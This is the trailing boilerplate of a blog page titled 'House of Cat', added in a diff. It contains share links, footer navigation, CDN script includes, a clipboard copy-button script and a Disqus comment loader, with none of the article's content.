+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/06/07/House-of-Cat/&is_video=false&description=House of Cat"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House of Cat&body=Check out this article: http://example.com/2023/06/07/House-of-Cat/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/06/07/House-of-Cat/&name=House of Cat&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/06/07/House-of-Cat/&t=House of Cat"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
